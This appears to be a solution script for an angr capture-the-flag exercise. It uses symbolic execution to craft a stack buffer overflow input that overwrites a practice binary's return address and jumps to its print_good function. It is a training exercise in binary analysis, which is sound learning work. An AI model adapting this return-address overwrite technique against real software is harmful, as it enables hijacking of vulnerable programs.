# From the taint_detect.py, we know the return address inside the read_input can be tainted.
# Now, we will exploit to jump to an arbitrary address, to output "Good Job!" string.

import angr
import claripy
import sys
from angr.sim_state import SimState
from angr.sim_procedure import SimProcedure
from angr.project import Project
from claripy.ast.bv import BV
from typing import List, Any
from angr.block import CapstoneInsn
from angr.analyses.cfg.cfg_fast import CFGFast

# Hook symbol __isoc99_scanf to our custom hook
class ScanfHook(SimProcedure):
    def run(self, fmt_ptr, buf_ptr):
        size = 25 + 4 + 4 # From the taint_detect.py result, we know 25 + 4 + 4 means size of buffer + ebp + return address
        sym_var = claripy.BVS("user_input", 8 * size)
        # We need to constraint the input:
        # 1. The first 25 + 4 bytes to be visible so that it'll be easier for us to copy-paste the input
        # 2. The last 4 bytes will overwrite the return address to jump to our desired address
        for i in range(25 + 4):
            byte = sym_var.get_byte(i)
            self.state.solver.add(byte >= 0x41) # A
            self.state.solver.add(byte <= 0x7a) # z
        good_job_sym = self.project.loader.find_symbol('print_good')
        good_job_addr = good_job_sym.rebased_addr
        print(f"[+] Overwriting return address to jump to print_good at 0x{good_job_addr:x}")
        for i in range(4):
            byte = sym_var.get_byte(25 + 4 + i)
            self.state.solver.add(byte == ((good_job_addr >> (i * 8)) & 0xff))

        # Ensure it's satisfiable
        if not self.state.solver.satisfiable():
            print("[-] Constraints are unsatisfiable!")
            sys.exit(1)

        # Get the satisfying input
        input_value = self.state.solver.eval(sym_var, cast_to=bytes)
        print(f"[+] Crafted input: {input_value}")

        return 1 # number of items successfully read

def install_hooks(proj: Project):
    proj.hook_symbol('__isoc99_scanf', ScanfHook())

def main(argv: List[str]):
    binary_path = argv[1] if len(argv) > 1 else "./binary/x32/17_angr_arbitrary_jump"
    proj = angr.Project(binary_path, auto_load_libs=False)

    install_hooks(proj)

    state = proj.factory.full_init_state(
        args=[binary_path],
        add_options={
            angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
            angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS,
    })

    simgr = proj.factory.simulation_manager(state)

    good_job_sym = proj.loader.find_symbol('print_good')
    good_job_addr = good_job_sym.rebased_addr

    simgr.explore(find=good_job_addr)

    if simgr.found:
        print("[+] Successfully reached print_good!")
    else:
        print("[-] Could not reach print_good.")

if __name__ == "__main__":
    main(sys.argv)